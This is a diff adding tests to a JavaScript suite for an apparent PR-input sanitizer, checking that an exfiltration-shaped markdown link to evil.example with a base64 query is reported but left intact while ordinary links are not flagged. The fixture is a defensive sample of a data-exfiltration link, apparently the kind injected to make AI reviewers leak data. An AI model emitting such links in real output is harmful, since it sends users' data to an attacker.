@@ -44,3 +44,22 @@ describe("sanitize-pr-input: neutralizes injection vectors", () => {
     assert.equal(report, "");
   });
 });
+
+describe("sanitize-pr-input: exfil-URL scan is non-destructive", () => {
+  it("reports an exfil-shaped markdown link but leaves the bytes intact", () => {
+    const input =
+      "diff text [a](https://evil.example/x?d=SGVsbG8gd29ybGQgbG9uZyBiYXNlNjQgcGF5bG9hZA) more\n";
+    const { out, report } = run(input);
+    assert.equal(out, input);
+    assert.match(report, /URLs shaped like data exfiltration/);
+    assert.match(report, /left intact/);
+    assert.match(report, /evil\.example/);
+  });
+
+  it("does not flag an ordinary markdown link", () => {
+    const input = "see [the docs](https://example.com/guide) for details\n";
+    const { out, report } = run(input);
+    assert.equal(out, input);
+    assert.equal(report, "");
+  });
+});
